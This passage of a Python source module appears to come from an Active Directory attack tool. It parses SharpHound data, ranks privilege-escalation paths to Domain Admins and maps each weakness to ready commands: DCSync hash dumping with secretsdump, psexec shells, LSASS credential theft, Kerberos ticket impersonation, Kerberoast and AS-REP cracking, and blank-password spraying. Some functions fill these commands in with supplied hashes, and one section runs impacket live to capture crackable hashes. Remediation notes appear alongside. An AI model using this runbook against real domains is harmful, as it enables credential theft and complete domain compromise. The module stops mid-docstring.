"""Ingest SharpHound/BloodHound collection and turn it into findings + attack paths.

Airgapped and stdlib-only: parses the JSON SharpHound drops (a `.zip`, a directory,
or individual `*.json`), builds the AD object graph in memory, then:

  * flags the misconfigurations / vulnerabilities BloodHound is known for -
    Kerberoastable & AS-REP-roastable accounts, unconstrained / constrained
    delegation, RBCD, DCSync rights held off tier-0, dangerous ACLs from low-priv
    principals, shadow-credential (AddKeyCredentialLink) edges, passwords in
    descriptions, PASSWD_NOTREQD, admins not marked "sensitive/cannot be
    delegated", a non-zero MachineAccountQuota, missing LAPS, ...;
  * finds the shortest privilege-escalation PATHS from an owned / low-privileged
    principal (or "any authenticated user") to Domain Admins / Enterprise Admins /
    the domain object / a DC, naming the exact EXISTING tool + command to walk
    each edge; and
  * when a credential / NT hash is supplied, emits the Kerberos actions to run for
    effect - roast, AS-REP, DCSync, delegation ticket forging - as references to
    impacket / certipy / netexec / Rubeus.

It generates no exploit code and does no scanning; it reads what SharpHound already
collected and turns it into a prioritised, provable runbook.
"""
from __future__ import annotations

import json
import os
import re
import zipfile
from collections import deque

# --- well-known SIDs / RIDs -----------------------------------------------------
# High-value = reaching it is effectively domain compromise. Matched by RID suffix
# (domain-relative) and by absolute built-in SID.
_HIGHVALUE_RID = {"512", "516", "518", "519", "521"}   # DA, DCs, Schema, EA, RODC-ish
# Credential-hint match for account descriptions, word-boundary so it doesn't fire on
# bypass/compass/passport (pass) or accredited/incredible (cred).
_PW_DESC_RE = re.compile(
    r"\b(pass(word|wd)?|pwd|secret|cred(ential)?|kennwort|mot\s+de\s+passe)\b"
    r"|pw\s*[:=]", re.I)
_HIGHVALUE_SID = {
    "S-1-5-32-544": "Administrators",
    "S-1-5-32-548": "Account Operators",
    "S-1-5-32-549": "Server Operators",
    "S-1-5-32-550": "Print Operators",
    "S-1-5-32-551": "Backup Operators",
}
# Low-priv "everyone" principals - a path from here means *any* user can walk it.
_EVERYONE_SID = {"S-1-1-0", "S-1-5-11", "S-1-5-32-545"}    # Everyone, Auth Users, Users
_EVERYONE_RID = {"513", "515"}                            # Domain Users, Domain Computers

# ACL rights that let the holder take control of the target object.
_CONTROL_RIGHTS = {
    "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "Owner",
    "AddMember", "AddSelf", "ForceChangePassword", "AllExtendedRights",
    "ReadLAPSPassword", "ReadGMSAPassword", "AddKeyCredentialLink", "WriteSPN",
    "AddAllowedToAct", "WriteAccountRestrictions",
}
# Edges an attacker can traverse to gain control of the destination.
_TRAVERSABLE = _CONTROL_RIGHTS | {
    "MemberOf", "DCSync", "AdminTo", "HasSession", "CanRDP", "CanPSRemote",
    "ExecuteDCOM", "AllowedToDelegate", "AllowedToAct", "GpLink", "SQLAdmin",
    "HasSIDHistory",
}

# Exact, EXISTING-tool abuse for each edge (how you PROVE / walk it).
EDGE_ABUSE = {
    "MemberOf": "inherit the group's rights (you are already a member)",
    "GenericAll": "over a user: reset its password (bloodyAD set password / net rpc password); "
                  "over a group: add a member (bloodyAD add groupMember); over a computer: "
                  "RBCD or shadow-credentials (see AddKeyCredentialLink)",
    "GenericWrite": "targeted Kerberoast (write a fake SPN, GetUserSPNs -request) or write "
                    "msDS-KeyCredentialLink / scriptPath (bloodyAD set object)",
    "WriteDacl": "grant yourself GenericAll/DCSync: impacket-dacledit -action write -rights "
                 "FullControl -principal <you> -target <obj>",
    "WriteOwner": "become owner then grant control: impacket-owneredit -action write -new-owner "
                  "<you> -target <obj> ; then dacledit as above",
    "Owns": "as owner, grant yourself full control with impacket-dacledit",
    "Owner": "as owner, grant yourself full control with impacket-dacledit",
    "AddMember": "add your principal to the group: bloodyAD add groupMember <group> <you>",
    "AddSelf": "add yourself to the group: bloodyAD add groupMember <group> <you>",
    "ForceChangePassword": "reset the target's password: net rpc password <user> -U ... "
                           "(or bloodyAD set password)",
    "AllExtendedRights": "on a user -> ForceChangePassword; on the domain -> DCSync",
    "ReadLAPSPassword": "read the local-admin password: netexec ldap <dc> -M laps  "
                        "(or pyLAPS --action get)",
    "ReadGMSAPassword": "recover the gMSA blob -> NT hash: gMSADumper.py / netexec ldap --gmsa",
    "AddKeyCredentialLink": "shadow credentials: certipy shadow auto -account <target> "
                            "(or pywhisker) -> PKINIT as the target",
    "WriteSPN": "targeted Kerberoast: set an SPN then GetUserSPNs -request",
    "DCSync": "impacket-secretsdump -just-dc <DOMAIN>/<you>@<dc>   # dumps every NTLM hash incl. krbtgt",
    "AdminTo": "you are local admin: impacket-psexec/wmiexec a SYSTEM shell, then dump SAM/LSASS",
    "HasSession": "a user session is on this host: dump LSASS (lsassy / impacket-secretsdump) "
                  "to steal that credential",
    "CanRDP": "RDP in with the credential: xfreerdp /v:<host> /u:<user>",
    "CanPSRemote": "WinRM shell: evil-winrm -i <host> -u <user>",
    "ExecuteDCOM": "DCOM lateral exec: impacket-dcomexec <DOMAIN>/<user>@<host>",
    "AllowedToDelegate": "constrained delegation: impacket-getST -spn <spn> -impersonate "
                         "Administrator <DOMAIN>/<acct> -hashes :<nt>",
    "AllowedToAct": "RBCD: impacket-rbcd -action write -delegate-to <computer> -delegate-from "
                    "<you> ; then getST -impersonate Administrator",
    "GpLink": "abuse the linked GPO: pygpoabuse / SharpGPOAbuse to run as SYSTEM on linked hosts",
    "SQLAdmin": "you are sysadmin on the linked MSSQL: mssqlclient -> xp_cmdshell / EXECUTE AS",
    "HasSIDHistory": "your SID history already grants the target's rights (no action needed)",
}

# Severity of a control edge when it targets a high-value object.
_EDGE_SEVERITY = {
    "GenericAll": "high", "WriteDacl": "high", "WriteOwner": "high", "Owns": "high",
    "Owner": "high", "GenericWrite": "high", "AddMember": "high", "AddSelf": "high",
    "ForceChangePassword": "high", "AllExtendedRights": "high",
    "AddKeyCredentialLink": "high", "ReadGMSAPassword": "high", "WriteSPN": "medium",
    "ReadLAPSPassword": "medium", "AdminTo": "high", "AllowedToDelegate": "high",
    "AllowedToAct": "high", "GpLink": "high", "DCSync": "critical",
}


# --- loading --------------------------------------------------------------------

def _iter_json_blobs(path: str):
    """Yield parsed JSON docs from a SharpHound output: a .zip of *.json, a
    directory of *.json, or a single *.json. Malformed members are skipped."""
    if os.path.isdir(path):
        for name in sorted(os.listdir(path)):
            if name.lower().endswith(".json"):
                with open(os.path.join(path, name), "r", errors="replace") as fh:
                    yield _safe_load(fh.read())
    elif path.lower().endswith(".zip"):
        with zipfile.ZipFile(path) as zf:
            for name in sorted(zf.namelist()):
                if name.lower().endswith(".json"):
                    yield _safe_load(zf.read(name).decode("utf-8", "replace"))
    elif path.lower().endswith(".json"):
        with open(path, "r", errors="replace") as fh:
            yield _safe_load(fh.read())


def _safe_load(text: str):
    try:
        return json.loads(text)
    except (ValueError, TypeError):
        return None


def _blob_type(blob: dict) -> str:
    """SharpHound tags each file: meta.type in users/computers/groups/domains/..."""
    meta = blob.get("meta") or {}
    return (meta.get("type") or "").lower()


def _results(x):
    """SharpHound stores collected principal lists either as a bare list or as
    {"Collected":bool,"Results":[...]} - normalise to a list."""
    if isinstance(x, dict):
        return x.get("Results") or []
    return x or []


def _oid(entry):
    """Extract an ObjectIdentifier (SID/GUID) from a member entry, which may be a
    {"ObjectIdentifier": ...} dict (current SharpHound) or a bare SID string
    (older/hand-built JSON). Returns None if neither."""
    if isinstance(entry, dict):
        return entry.get("ObjectIdentifier") or entry.get("UserSID")
    if isinstance(entry, str):
        return entry
    return None


def is_sharphound(path: str) -> bool:
    """True if `path` looks like a SharpHound collection (has a typed JSON blob)."""
    try:
        for blob in _iter_json_blobs(path):
            if isinstance(blob, dict) and _blob_type(blob) in (
                    "users", "computers", "groups", "domains", "gpos", "ous",
                    "containers"):
                return True
    except (OSError, zipfile.BadZipFile):
        return False
    return False


def load_graph(path: str) -> dict:
    """Parse a SharpHound collection into a graph:
        {"nodes": {sid: {type,name,domain,props}}, "edges": [(src,label,dst)],
         "adj": {src: [(label,dst)]}, "domains": {sid: props}}
    """
    nodes: dict[str, dict] = {}
    edges: list[tuple] = []
    domains: dict[str, dict] = {}

    def add_node(sid, ntype, props):
        if not sid:
            return
        sid = sid.upper() if sid.startswith("s-1-") else sid
        cur = nodes.get(sid)
        name = (props.get("name") or props.get("distinguishedname") or "").strip()
        if cur is None:
            nodes[sid] = {"type": ntype, "name": name,
                          "domain": (props.get("domain") or "").strip(),
                          "props": props}
        else:
            cur["type"] = cur["type"] or ntype
            cur["name"] = cur["name"] or name
            if props:
                cur["props"].update({k: v for k, v in props.items() if v is not None})

    def _nsid(sid):
        # Match add_node's key normalization so edge endpoints line up with node keys
        # even for lowercase (older / hand-built) SharpHound JSON.
        return sid.upper() if isinstance(sid, str) and sid.startswith("s-1-") else sid

    def add_edge(src, label, dst):
        src, dst = _nsid(src), _nsid(dst)
        if src and dst and src != dst:
            edges.append((src, label, dst))

    def add_aces(obj_sid, obj):
        for ace in obj.get("Aces") or []:
            prin = ace.get("PrincipalSID")
            right = ace.get("RightName") or ace.get("Right")
            if prin and right:
                add_edge(prin, right, obj_sid)

    for blob in _iter_json_blobs(path):
        if not isinstance(blob, dict):
            continue
        btype = _blob_type(blob)
        for obj in blob.get("data") or []:
            if not isinstance(obj, dict):
                continue
            sid = obj.get("ObjectIdentifier")
            props = obj.get("Properties") or {}
            ntype = {"users": "User", "computers": "Computer", "groups": "Group",
                     "domains": "Domain", "gpos": "GPO", "ous": "OU",
                     "containers": "Container"}.get(btype, "Base")
            add_node(sid, ntype, props)
            add_aces(sid, obj)

            if btype == "groups":
                for m in obj.get("Members") or []:
                    add_edge(_oid(m), "MemberOf", sid)
            elif btype == "computers":
                for m in _results(obj.get("LocalAdmins")):
                    add_edge(_oid(m), "AdminTo", sid)
                for m in _results(obj.get("RemoteDesktopUsers")):
                    add_edge(_oid(m), "CanRDP", sid)
                for m in _results(obj.get("PSRemoteUsers")):
                    add_edge(_oid(m), "CanPSRemote", sid)
                for m in _results(obj.get("DcomUsers")):
                    add_edge(_oid(m), "ExecuteDCOM", sid)
                for s in _results(obj.get("Sessions")):
                    add_edge(sid, "HasSession", _oid(s))
                for t in obj.get("AllowedToDelegate") or []:
                    add_edge(sid, "AllowedToDelegate", _oid(t))
                for m in _results(obj.get("AllowedToAct")):
                    add_edge(_oid(m), "AllowedToAct", sid)
            elif btype == "users":
                for t in obj.get("AllowedToDelegate") or []:
                    add_edge(sid, "AllowedToDelegate", _oid(t))
            elif btype == "domains":
                domains[sid] = props
                domains[sid]["_trusts"] = obj.get("Trusts") or []

    # Synthesize DCSync: a principal holding both GetChanges and GetChangesAll on a
    # domain object can replicate secrets (impacket-secretsdump -just-dc).
    dcsync_src: dict[str, set] = {}
    for src, label, dst in edges:
        if label in ("GetChanges", "GetChangesAll", "GetChangesInFilteredSet") \
                and nodes.get(dst, {}).get("type") == "Domain":
            dcsync_src.setdefault((src, dst), set()).add(label)
    for (src, dst), rights in dcsync_src.items():
        if {"GetChanges", "GetChangesAll"} <= rights:
            edges.append((src, "DCSync", dst))

    adj: dict[str, list] = {}
    for src, label, dst in edges:
        adj.setdefault(src, []).append((label, dst))
    return {"nodes": nodes, "edges": edges, "adj": adj, "domains": domains}


# --- classification helpers -----------------------------------------------------

def _rid(sid: str) -> str:
    return sid.rsplit("-", 1)[-1] if sid and sid.startswith("S-1-5-21-") else ""


def is_highvalue(sid: str, node: dict) -> bool:
    if sid in _HIGHVALUE_SID:
        return True
    if _rid(sid) in _HIGHVALUE_RID:
        return True
    props = (node or {}).get("props") or {}
    if props.get("highvalue") is True:
        return True
    tags = props.get("system_tags") or ""
    return "admin_tier_0" in str(tags).lower()


def is_everyone(sid: str) -> bool:
    return sid in _EVERYONE_SID or _rid(sid) in _EVERYONE_RID


def short(node: dict) -> str:
    """A readable node label ('DOMAIN ADMINS@CORP.LOCAL' -> 'DOMAIN ADMINS')."""
    name = (node or {}).get("name") or ""
    return name.split("@")[0] if name else "(unknown)"


# --- attack-path finding --------------------------------------------------------

def high_value_targets(graph: dict) -> dict[str, dict]:
    """Every node whose compromise means domain compromise: high-value groups, the
    domain object(s), and Domain Controller computers."""
    out = {}
    for sid, node in graph["nodes"].items():
        if node["type"] == "Domain" or is_highvalue(sid, node):
            out[sid] = node
    for sid in graph["domains"]:
        out[sid] = graph["nodes"].get(sid, {"type": "Domain", "name": sid, "props": {}})
    return out


def _sources(graph: dict, owned: set[str]) -> list[str]:
    """Path start points: explicitly-owned principals if given, else the low-priv
    'everyone' principals so we surface what ANY authenticated user can reach."""
    owned = {o.upper() for o in (owned or set())}
    starts = []
    for sid, node in graph["nodes"].items():
        nm = (node.get("name") or "").upper()
        if sid.upper() in owned or short(node).upper() in owned or nm in owned:
            starts.append(sid)
    if starts:
        return starts
    return [sid for sid in graph["nodes"] if is_everyone(sid)]


def _bfs(graph: dict, starts: list[str], targets: set[str]) -> list[tuple] | None:
    """Shortest edge path from any start to any target. Returns [(src,label,dst)]."""
    adj = graph["adj"]
    seen = set(starts)
    q = deque((s, []) for s in starts)
    while q:
        cur, path = q.popleft()
        if cur in targets and path:
            return path
        for label, dst in adj.get(cur, ()):
            if dst in seen or label not in _TRAVERSABLE:
                continue
            seen.add(dst)
            q.append((dst, path + [(cur, label, dst)]))
    return None


def attack_paths(graph: dict, owned: set[str] | None = None,
                 max_paths: int = 25) -> list[dict]:
    """Shortest path from an owned/low-priv principal to each high-value target.
    Each: {start, target, length, steps:[{src,label,dst,abuse}], chain}."""
    starts = _sources(graph, owned or set())
    if not starts:
        return []
    # "Any authenticated user" only when the start set is the low-priv fallback -
    # not merely when --owned was omitted (an --owned that matched nothing also
    # falls back to everyone, and mislabelling it as a named user is misleading).
    any_user = all(is_everyone(s) for s in starts)
    targets = high_value_targets(graph)
    out = []
    for tsid, tnode in targets.items():
        path = _bfs(graph, starts, {tsid})
        if not path:
            continue
        steps = [{"src": short(graph["nodes"].get(s, {})),
                  "label": lbl,
                  "dst": short(graph["nodes"].get(d, {})),
                  "abuse": EDGE_ABUSE.get(lbl, lbl)} for s, lbl, d in path]
        start_name = steps[0]["src"]
        chain = start_name + "".join(
            f"  -[{st['label']}]->  {st['dst']}" for st in steps)
        out.append({"start": start_name, "target": short(tnode),
                    "length": len(path), "steps": steps, "chain": chain,
                    "any_user": any_user})
    out.sort(key=lambda p: p["length"])
    return out[:max_paths]


# --- curated tier-0 architecture (for a graphical diagram) ----------------------

# SharpHound encodes trust direction as an int (or, in older/hand-built JSON, a
# string). Map both to a readable word.
_TRUST_DIR = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional",
              "0": "Disabled", "1": "Inbound", "2": "Outbound", "3": "Bidirectional"}


def _domain_names(graph: dict) -> dict[str, str]:
    """sid -> display name for every domain object."""
    out = {}
    for sid, props in graph["domains"].items():
        node = graph["nodes"].get(sid, {})
        out[sid] = (node.get("name") or props.get("name") or sid).upper()
    return out


def architecture(graph: dict, max_nodes: int = 60) -> dict:
    """A curated *tier-0* subgraph for a graphical architecture diagram — NOT the
    whole BloodHound graph (which is unreadable). It keeps only what matters to
    domain security: the domain object(s), the high-value groups, the Domain
    Controllers, the privileged principals that are members of those groups, and
    the control edges (ACL / DCSync) that reach a high-value object — plus domain
    trust edges. Returns a JSON-serialisable dict:

        {"nodes": {sid: {type, label, domain, hv, dc, tier}},
         "edges": [[src, label, dst], ...],       # MemberOf / control / DCSync
         "trusts": [[src_name, direction, dst_name], ...],
         "truncated": bool}                        # True if members were capped

    Tiers: 0 = domain object(s), 1 = high-value groups + Domain Controllers,
    2 = their privileged members.
    """
    nodes = graph["nodes"]
    hv = high_value_targets(graph)                 # domains + high-value groups/nodes
    keep: dict[str, int] = {}                      # sid -> tier
    truncated = False

    # Tier 0: the domain object(s) at the top.
    for sid in graph["domains"]:
        keep[sid] = 0
    # Tier 1: high-value groups / objects (Domain Admins, Administrators, ...).
    for sid, node in hv.items():
        if sid not in keep:
            if len(keep) >= max_nodes:
                truncated = True
                break
            keep[sid] = 1
    # Tier 1: Domain Controllers (the computers that anchor the domain).
    for sid, node in nodes.items():
        if node.get("type") == "Computer" and (is_dc(node) or is_highvalue(sid, node)):
            if sid not in keep:
                if len(keep) >= max_nodes:
                    truncated = True
                    break
                keep[sid] = 1

    # Reverse MemberOf adjacency: the members of each group.
    members_of: dict[str, list[str]] = {}
    for src, label, dst in graph["edges"]:
        if label == "MemberOf":
            members_of.setdefault(dst, []).append(src)

    # Tier 2: the privileged members of the high-value groups (direct members —
    # one hop keeps the picture legible; the full transitive set is in the paths).
    for gsid in [s for s, t in keep.items() if t == 1]:
        for msid in members_of.get(gsid, []):
            if msid in keep:
                continue
            if len(keep) >= max_nodes:
                truncated = True
                break
            keep[msid] = 2

    # Tier 2 also: any principal holding a control edge (ACL / DCSync) INTO a kept
    # tier-0/tier-1 object (a domain, high-value group or DC) — it can seize tier-0,
    # so the diagram must show it. (Control over a tier-2 member is a further hop and
    # is left to the attack-path section.)
    for src, label, dst in graph["edges"]:
        if src in keep or keep.get(dst, 9) > 1:
            continue
        if label == "DCSync" or label in _CONTROL_RIGHTS:
            if len(keep) >= max_nodes:
                truncated = True
                break
            keep[src] = 2

    # Edges wholly inside the kept set: MemberOf (membership), DCSync, and control
    # ACLs (GenericAll/WriteDacl/...). Deduped.
    out_edges, seen = [], set()
    for src, label, dst in graph["edges"]:
        if src not in keep or dst not in keep:
            continue
        if label == "MemberOf" or label == "DCSync" or label in _CONTROL_RIGHTS:
            k = (src, label, dst)
            if k not in seen:
                seen.add(k)
                out_edges.append([src, label, dst])

    # Domain trust edges (observed on the domain objects, never inferred).
    dnames = _domain_names(graph)
    trusts = []
    for sid, props in graph["domains"].items():
        src_name = dnames.get(sid, sid)
        for t in props.get("_trusts") or []:
            if not isinstance(t, dict):
                continue
            tgt = (t.get("TargetDomainName") or t.get("name")
                   or t.get("TargetDomainSid") or "")
            if not tgt:
                continue
            direction = t.get("TrustDirection", t.get("direction", ""))
            trusts.append([src_name, _TRUST_DIR.get(direction, str(direction) or ""),
                           str(tgt).upper()])

    out_nodes = {}
    for sid, tier in keep.items():
        node = nodes.get(sid) or {"type": "Domain", "name": dnames.get(sid, sid),
                                  "domain": "", "props": {}}
        out_nodes[sid] = {
            "type": node.get("type", "Base"),
            "label": short(node) if node.get("name") else dnames.get(sid, sid),
            "domain": (node.get("domain") or "").upper(),
            "hv": bool(sid in hv or is_highvalue(sid, node)),
            "dc": bool(node.get("type") == "Computer" and is_dc(node)),
            "tier": tier,
        }
    return {"nodes": out_nodes, "edges": out_edges, "trusts": trusts,
            "truncated": truncated}


# --- misconfiguration / vulnerability findings ----------------------------------

def _finding(cat, sev, title, principal, target, detail, tool, cmd, rem):
    return {"category": cat, "severity": sev, "title": title, "principal": principal,
            "target": target, "detail": detail, "tool": tool, "command": cmd,
            "remediation": rem}


def findings(graph: dict) -> list[dict]:
    """Every AD misconfiguration / vulnerability the graph reveals, most-severe
    first. Each carries the exact EXISTING-tool command to prove/abuse it."""
    out: list[dict] = []
    nodes = graph["nodes"]
    # Domain Controllers: computers that are members of the Domain Controllers
    # group (RID 516). DCs legitimately hold unconstrained delegation, so we use
    # this (not a name guess) to avoid flagging them.
    dc_sids = {src for src, label, dst in graph["edges"]
               if label == "MemberOf" and _rid(dst) == "516"}

    for sid, node in nodes.items():
        props = node.get("props") or {}
        name = node.get("name") or short(node)
        ntype = node["type"]
        enabled = props.get("enabled")
        enabled = True if enabled is None else enabled     # SharpHound null -> unknown

        if ntype == "User" and props.get("hasspn") and enabled \
                and not name.upper().startswith("KRBTGT"):
            hv = is_highvalue(sid, node) or props.get("admincount") is True
            spns = props.get("serviceprincipalnames") or []
            out.append(_finding(
                "kerberoast", "high" if hv else "medium",
                "Kerberoastable account" + (" (privileged!)" if hv else ""),
                name, "", f"SPN(s): {', '.join(spns) if isinstance(spns, list) else spns}"
                + (" - member of / flagged admin" if hv else ""),
                "impacket-GetUserSPNs",
                "impacket-GetUserSPNs -request -dc-ip <dc> <DOMAIN>/<user>:<pass> "
                "-outputfile spns.hash ; hashcat -m 13100 spns.hash wordlist",
                "Use a long random gMSA/managed password; minimise SPNs on user accounts."))

        if ntype == "User" and props.get("dontreqpreauth") and enabled:
            out.append(_finding(
                "asrep", "medium", "AS-REP roastable account (no Kerberos pre-auth)",
                name, "", "DONT_REQ_PREAUTH set - request an AS-REP and crack it offline.",
                "impacket-GetNPUsers",
                "impacket-GetNPUsers -dc-ip <dc> -request -format hashcat <DOMAIN>/ "
                "-usersfile users.txt ; hashcat -m 18200 asrep.hash wordlist",
                "Require Kerberos pre-authentication on the account."))

        if props.get("unconstraineddelegation") and sid not in dc_sids \
                and not is_dc(node):
            out.append(_finding(
                "delegation", "high", "Unconstrained delegation (non-DC)",
                name, "", "Holds unconstrained delegation - coerce a DC/privileged host "
                "to authenticate and capture its TGT.",
                "krbrelayx + coercer",
                "printerbug.py/PetitPotam to coerce <target> -> krbrelayx captures the "
                "TGT ; then impacket-secretsdump / getST with the ticket",
                "Remove unconstrained delegation; use constrained/RBCD, mark tier-0 "
                "accounts 'sensitive and cannot be delegated'."))

    # ACL / delegation / DCSync edges toward high-value objects.
    for src, label, dst in graph["edges"]:
        dnode = nodes.get(dst, {})
        snode = nodes.get(src, {})
        if label == "DCSync":
            if not is_highvalue(src, snode):
                out.append(_finding(
                    "dcsync", "critical", "DCSync rights held off tier-0",
                    short(snode), short(dnode),
                    "Principal can replicate directory secrets (GetChanges + "
                    "GetChangesAll) yet is not a Domain/Enterprise Admin.",
                    "impacket-secretsdump",
                    "impacket-secretsdump -just-dc <DOMAIN>/<principal>@<dc>",
                    "Remove the replication ACEs from non-DC principals."))
            continue
        if label == "AddKeyCredentialLink" and (is_highvalue(dst, dnode)
                                                or dnode.get("type") in ("User", "Computer")):
            out.append(_finding(
                "shadowcred", "high", "Shadow-credential edge (AddKeyCredentialLink)",
                short(snode), short(dnode),
                "Principal can add a KeyCredential to the target -> PKINIT as the target.",
                "certipy shadow",
                "certipy shadow auto -u <you>@<dom> -p <pass> -account <target>",
                "Restrict write on msDS-KeyCredentialLink; enable strong ADCS mapping."))
            continue
        if label in ("AllowedToAct",):
            out.append(_finding(
                "rbcd", "high", "Resource-Based Constrained Delegation configured",
                short(snode), short(dnode),
                "Principal is allowed to act on the target computer (RBCD).",
                "impacket-rbcd + getST",
                "impacket-getST -spn cifs/<target> -impersonate Administrator "
                "<DOMAIN>/<principal> -hashes :<nt>",
                "Audit msDS-AllowedToActOnBehalfOfOtherIdentity; remove unneeded RBCD."))
            continue
        if label in _CONTROL_RIGHTS and is_highvalue(dst, dnode) and is_everyone(src):
            out.append(_finding(
                "acl", "critical", f"Dangerous ACL from a low-priv principal ({label})",
                short(snode), short(dnode),
                f"{short(snode)} (any authenticated user) has {label} over the "
                f"high-value object {short(dnode)}.",
                "impacket-dacledit / bloodyAD",
                EDGE_ABUSE.get(label, label),
                "Remove the ACE; restrict control of tier-0 objects to tier-0."))
        elif label in _CONTROL_RIGHTS and is_highvalue(dst, dnode) \
                and not is_highvalue(src, snode):
            out.append(_finding(
                "acl", _EDGE_SEVERITY.get(label, "medium"),
                f"Control edge toward a high-value object ({label})",
                short(snode), short(dnode),
                f"{short(snode)} has {label} over {short(dnode)}.",
                "impacket-dacledit / bloodyAD", EDGE_ABUSE.get(label, label),
                "Remove the ACE; keep tier-0 control within tier-0."))

    # Domain-wide hygiene.
    for dsid, dprops in graph["domains"].items():
        quota = dprops.get("machineaccountquota")
        if quota not in (None, 0, "0"):
            out.append(_finding(
                "hygiene", "medium", "MachineAccountQuota > 0 (any user can add computers)",
                dprops.get("name") or dsid, "",
                f"MachineAccountQuota={quota} - any authenticated user can join up to "
                f"{quota} machine accounts, enabling RBCD / shadow-cred pivots.",
                "netexec / bloodyAD",
                "set ms-DS-MachineAccountQuota to 0 (delegate machine-join to admins)",
                "Set MachineAccountQuota to 0."))

    # Passwords in descriptions / PASSWD_NOTREQD (cheap, high-signal).
    for sid, node in nodes.items():
        props = node.get("props") or {}
        desc = str(props.get("description") or "")
        # Word-boundary match: a loose substring fired on bypass/compass/passport
        # ("pass") and accredited/incredible ("cred"), flagging benign descriptions.
        if _PW_DESC_RE.search(desc):
            out.append(_finding(
                "creds", "high", "Possible password in account description",
                node.get("name") or short(node), "",
                f'description="{desc[:120]}"', "manual",
                "read the description; test the credential with netexec",
                "Remove secrets from AD attributes."))
        if props.get("passwordnotreqd") is True:
            out.append(_finding(
                "hygiene", "medium", "PASSWD_NOTREQD set (account may have a blank password)",
                node.get("name") or short(node), "",
                "The account can have an empty password - spray a blank.", "netexec",
                "netexec smb <dc> -u '<user>' -p ''", "Unset PASSWD_NOTREQD; enforce a policy."))

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    out.sort(key=lambda f: order.get(f["severity"], 5))
    return out


def is_dc(node: dict) -> bool:
    props = (node or {}).get("props") or {}
    if node.get("type") != "Computer":
        return False
    host = (node.get("name") or "").upper().split(".")[0]
    return "DOMAIN CONTROLLER" in str(props.get("system_tags") or "").upper() \
        or bool(props.get("isdc")) \
        or "DC" in host.split("-") or host.startswith("DC")


# --- Kerberos "for effect" (needs a credential/hash) ----------------------------

def kerberos_actions(graph: dict, creds: dict | None) -> list[dict]:
    """With a credential/NT hash, the Kerberos actions to run for EFFECT: roast,
    AS-REP, DCSync, delegation ticket forging. `creds`:
    {domain, user, secret, is_hash(bool), dc_ip}. Returns [{title, command, why}]."""
    creds = creds or {}
    dom = creds.get("domain") or "<DOMAIN>"
    user = creds.get("user") or "<user>"
    dc = creds.get("dc_ip") or "<dc>"
    auth = f"-hashes :{creds['secret']}" if creds.get("is_hash") else \
        (f":{creds['secret']}" if creds.get("secret") else ":<pass>")
    up = f"{dom}/{user}" + ("" if creds.get("is_hash") else auth)
    hsuf = f" {auth}" if creds.get("is_hash") else ""
    nodes = graph["nodes"]
    fset = findings(graph)
    actions: list[dict] = []

    roastable = [f for f in fset if f["category"] == "kerberoast"]
    if roastable:
        actions.append({"title": f"Kerberoast {len(roastable)} account(s)",
                        "command": f"impacket-GetUserSPNs -request -dc-ip {dc} {up}{hsuf} "
                        f"-outputfile spns.hash && hashcat -m 13100 spns.hash rockyou.txt",
                        "why": "Recover service-account passwords offline; feed cracked "
                        "creds back in for the next hop."})
    asrep = [f for f in fset if f["category"] == "asrep"]
    if asrep:
        actions.append({"title": f"AS-REP roast {len(asrep)} account(s)",
                        "command": f"impacket-GetNPUsers -dc-ip {dc} -request -format hashcat "
                        f"{dom}/ -no-pass -usersfile asrep_users.txt && hashcat -m 18200 asrep.hash rockyou.txt",
                        "why": "No pre-auth required - crack these AS-REPs offline."})
    dcsyncers = [f for f in fset if f["category"] == "dcsync"]
    if dcsyncers or any(is_highvalue(s, nodes.get(s, {})) for s in _sources(graph, set())):
        actions.append({"title": "DCSync the domain (once you hold a DCSync principal)",
                        "command": f"impacket-secretsdump -just-dc {dom}/{user}@{dc}{hsuf}",
                        "why": "Pull every NTLM hash including krbtgt -> golden-ticket "
                        "persistence (impacket-ticketer)."})
    deleg = [f for f in fset if f["category"] in ("delegation", "rbcd")]
    if deleg:
        actions.append({"title": f"Abuse delegation ({len(deleg)} finding(s)) for a "
                        "Kerberos ticket",
                        "command": f"impacket-getST -spn cifs/<target> -impersonate "
                        f"Administrator {up}{hsuf}  # then export KRB5CCNAME and psexec",
                        "why": "S4U impersonation yields a service ticket as any user "
                        "(e.g. Administrator) on the target."})
    return actions


# --- live Kerberos capture (impacket) -------------------------------------------
# With a credential and a DC IP, recce doesn't just STAGE the roast - it runs the
# published impacket tools to CAPTURE the actual crackable material (TGS-REP /
# AS-REP hashes, replicated NTLM hashes) and folds each capture back in as a
# CONFIRMED, proven finding with the real loot attached. All three are read-only
# (request tickets / replicate secrets) - nothing on the target is modified - and
# they only run when the operator opts in with an explicit flag.

def _kerb_tool(*names):
    """First installed tool among `names` (handles both `impacket-Foo` and
    `Foo.py` packagings). Returns the resolved path or None."""
    import shutil
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


def _run(cmd, timeout: int = 240) -> tuple[str, str | None]:
    from .util import run_tool
    return run_tool(cmd, timeout)


def _impacket_target(creds: dict, at_dc: bool = False) -> tuple[str, list[str]]:
    """(target, extra_flags) for an impacket command from a creds dict.
    Password -> DOM/user:pass; NT hash -> DOM/user + `-hashes :<nt>`."""
    dom = creds.get("domain") or ""
    user = creds.get("user") or ""
    secret = creds.get("secret") or ""
    dc = creds.get("dc_ip") or ""
    base = f"{dom}/{user}" if dom else user
    flags: list[str] = []
    if creds.get("is_hash") and secret:
        flags = ["-hashes", f":{secret}"]
    elif secret:
        base = f"{base}:{secret}"
    if at_dc and dc:
        base = f"{base}@{dc}"
    return base, flags


def parse_tgs(output: str) -> list[dict]:
    """TGS-REP hashes from GetUserSPNs -request output.
    $krb5tgs$23$*USER$REALM$SPN*$... -> {user, spn, hash}."""
    out = []
    for line in output.splitlines():
        line = line.strip()
        if not line.startswith("$krb5tgs$"):
            continue
        m = re.match(r"\$krb5tgs\$\d+\$\*([^$]+)\$([^$]+)\$([^*]+)\*", line)
        out.append({"user": m.group(1) if m else "",
                    "spn": m.group(3) if m else "",
                    "hash": line})
    return out


def parse_asrep(output: str) -> list[dict]:
    """AS-REP hashes from GetNPUsers -request output.
    $krb5asrep$23$user@REALM:... -> {user, hash}."""
    out = []
    for line in output.splitlines():
        line = line.strip()
        if not line.startswith("$krb5asrep$"):
            continue
        m = re.match(r"\$krb5asrep\$\d+\$([^@:]+)", line)
        out.append({"user": m.group(1) if m else "", "hash": line})
    return out


def parse_secretsdump(output: str) -> list[dict]:
    """NTLM hashes from secretsdump -just-dc.
